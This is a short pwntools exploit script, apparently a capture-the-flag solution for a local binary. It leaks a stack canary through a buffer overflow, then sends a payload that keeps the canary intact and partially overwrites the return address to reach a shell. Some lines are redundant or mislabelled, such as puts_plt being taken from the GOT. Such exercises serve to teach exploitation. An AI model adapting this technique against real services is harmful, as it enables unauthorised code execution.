
import sys   
sys.setrecursionlimit(100000) 
from pwn import *
from LibcSearcher import *
p=process("./pwn")
elf=ELF("./pwn")
# pause()
pop_rdi=0x0000000000000a63
puts_got=elf.got["puts"]
puts_got=elf.got["puts"]
puts_plt=elf.got["puts"]

payload=b'a'*0x28
p.recvline()
# pause()
p.sendline(payload)


p.recvline()
canary=u64(p.recv(7).rjust(8,b'\x00'))
print(hex(canary))
path_=u64(p.recv().ljust(8,b'\x00'))
print(hex(path_))
payload2=b'a'*0x28
payload2+=p64(canary)+b'a'*8*3
payload2+=b'\x90\x91'
pause()
p.send(payload2)
print(p.recvuntil(b'You had me at hello.\n'))

p.interactive()